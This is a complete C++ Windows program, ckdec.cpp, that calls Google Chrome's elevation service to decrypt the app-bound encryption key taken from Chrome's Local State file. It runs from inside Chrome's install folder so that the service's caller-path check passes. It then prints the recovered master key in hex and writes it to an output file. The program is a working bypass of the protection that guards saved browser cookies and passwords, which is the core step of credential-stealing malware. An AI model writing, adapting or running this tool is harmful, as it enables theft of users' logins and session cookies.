// language: C++, file: ckdec.cpp, target: Windows 10/11 x64, clang-cl/MSVC
// Calls Chrome's elevation service with the app-bound key blob taken from
// Local State (after the "APPB" prefix). DecryptData does the SYSTEM+user
// DPAPI unwrap, validates the caller path, then undoes the CNG app-bound
// layer. The caller must run from the trimmed Chrome path, e.g.
//   C:\Program Files\Google\Chrome\Application\ckdec.exe
// so that MaybeTrimProcessPath() yields C:\Program Files\Google\Chrome.
//
// usage: ckdec.exe <payload.bin> <key.out>

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <objbase.h>
#include <oleauto.h>

#include <cstdio>
#include <cstdlib>
#include <vector>

// Stable Chrome install mode (chrome/install_static/google_chrome_install_modes.h).
static const CLSID kElevatorClsid = {
    0x708860e0, 0xf641, 0x4611,
    {0x88, 0x95, 0x7d, 0x86, 0x7d, 0xd3, 0x67, 0x5b}};

// IElevator2Chrome first; older services only expose the shorter IIDs.
static const IID kElevatorIids[] = {
    {0x1bf5208b, 0x295f, 0x4992,
     {0xb5, 0xf4, 0x3a, 0x9b, 0xb6, 0x49, 0x48, 0x38}},  // IElevator2Chrome
    {0x463abecf, 0x410d, 0x407f,
     {0x8a, 0xf5, 0x0d, 0xf3, 0x5a, 0x00, 0x5c, 0xc8}},  // IElevatorChrome
    {0xa949cb4e, 0xc4f9, 0x44c4,
     {0xb2, 0x13, 0x6b, 0xf8, 0xaa, 0x9a, 0xc6, 0x9c}},  // IElevator
};

// Vtable order from elevation_service_idl.idl. IElevator is a prefix of it.
struct IElevatorAny : IUnknown {
  virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
      const wchar_t* crx_path, const wchar_t* browser_appid,
      const wchar_t* browser_version, const wchar_t* session_id,
      DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;
  virtual HRESULT STDMETHODCALLTYPE EncryptData(int protection_level,
                                                BSTR plaintext,
                                                BSTR* ciphertext,
                                                DWORD* last_error) = 0;
  virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR ciphertext,
                                                BSTR* plaintext,
                                                DWORD* last_error) = 0;
};

static bool read_file(const wchar_t* path, std::vector<unsigned char>& out) {
  HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h == INVALID_HANDLE_VALUE) return false;
  LARGE_INTEGER size;
  if (!GetFileSizeEx(h, &size) || size.QuadPart <= 0 ||
      size.QuadPart > 64 * 1024 * 1024) {
    CloseHandle(h);
    return false;
  }
  out.resize(static_cast<size_t>(size.QuadPart));
  DWORD got = 0;
  bool ok = ReadFile(h, out.data(), static_cast<DWORD>(out.size()), &got,
                     nullptr) != FALSE;
  CloseHandle(h);
  return ok && got == out.size();
}

static bool write_file(const wchar_t* path,
                       const std::vector<unsigned char>& data) {
  HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h == INVALID_HANDLE_VALUE) return false;
  DWORD wrote = 0;
  bool ok = WriteFile(h, data.data(), static_cast<DWORD>(data.size()), &wrote,
                      nullptr) != FALSE;
  CloseHandle(h);
  return ok && wrote == data.size();
}

int wmain(int argc, wchar_t** argv) {
  if (argc != 3) {
    std::fwprintf(stderr, L"usage: %ls <payload.bin> <key.out>\n", argv[0]);
    return 2;
  }

  std::vector<unsigned char> payload;
  if (!read_file(argv[1], payload)) {
    std::fwprintf(stderr, L"cannot read %ls\n", argv[1]);
    return 2;
  }
  std::wprintf(L"payload %zu bytes\n", payload.size());

  HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
  if (FAILED(hr)) {
    std::wprintf(L"CoInitializeEx 0x%08X\n", hr);
    return 1;
  }

  IElevatorAny* elevator = nullptr;
  for (const IID& iid : kElevatorIids) {
    hr = CoCreateInstance(kElevatorClsid, nullptr, CLSCTX_LOCAL_SERVER, iid,
                          reinterpret_cast<void**>(&elevator));
    if (SUCCEEDED(hr) && elevator) break;
    elevator = nullptr;
  }
  if (!elevator) {
    std::wprintf(L"CoCreateInstance failed, last hr 0x%08X\n", hr);
    CoUninitialize();
    return 1;
  }

  // The service impersonates the caller for the user DPAPI layer. Without an
  // explicit impersonation level the proxy defaults to identify, and
  // CryptUnprotectData fails with ERROR_ACCESS_DENIED.
  hr = CoSetProxyBlanket(
      reinterpret_cast<IUnknown*>(elevator), RPC_C_AUTHN_DEFAULT,
      RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
      RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr,
      EOAC_DYNAMIC_CLOAKING);
  if (FAILED(hr)) {
    std::wprintf(L"CoSetProxyBlanket 0x%08X\n", hr);
    elevator->Release();
    CoUninitialize();
    return 1;
  }

  BSTR in = SysAllocStringByteLen(reinterpret_cast<LPCSTR>(payload.data()),
                                  static_cast<UINT>(payload.size()));
  if (!in) {
    elevator->Release();
    CoUninitialize();
    return 1;
  }

  BSTR out = nullptr;
  DWORD last_error = 0;
  hr = elevator->DecryptData(in, &out, &last_error);
  std::wprintf(L"DecryptData hr=0x%08X last_error=%lu\n", hr, last_error);

  int rc = 1;
  if (SUCCEEDED(hr) && out) {
    UINT len = SysStringByteLen(out);
    std::vector<unsigned char> key(reinterpret_cast<unsigned char*>(out),
                                   reinterpret_cast<unsigned char*>(out) + len);
    std::wprintf(L"plaintext %u bytes:", len);
    for (unsigned char b : key) std::wprintf(L" %02x", b);
    std::wprintf(L"\n");
    if (write_file(argv[2], key)) {
      std::wprintf(L"wrote %ls\n", argv[2]);
      rc = 0;
    } else {
      std::fwprintf(stderr, L"cannot write %ls\n", argv[2]);
    }
  }

  if (out) SysFreeString(out);
  SysFreeString(in);
  elevator->Release();
  CoUninitialize();
  return rc;
}
